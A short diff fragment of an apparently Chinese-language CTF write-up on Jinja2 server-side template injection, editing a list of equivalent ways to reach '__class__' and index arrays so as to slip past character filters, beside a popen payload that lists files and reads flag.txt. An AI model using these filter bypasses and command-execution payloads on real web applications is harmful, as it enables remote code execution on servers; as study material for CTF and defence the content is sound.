@@ -230,12 +230,13 @@ popen("cd ..;cd ..;cd ..;ls;cat flag.txt").read()
 
 
 等效：
-* `request.__class__`
-* `request["__class__"]`
-* `request|attr("__class__")`
+request.__class__
+request["__class__"]
+request["__cla"+"ss__"]
+request|attr("__class__")
 
-* `array[0]`
-* `array.pop(0)`
+array[0]
+array.pop(0)
 ```
 单引号'被过滤可以用双引号"代替；至于点.和下划线_被过滤可以采用16进制来表示，用[](类似数组下标)的方式选定。知道怎么过滤了那就照着以前payload修改就好了。
 ```
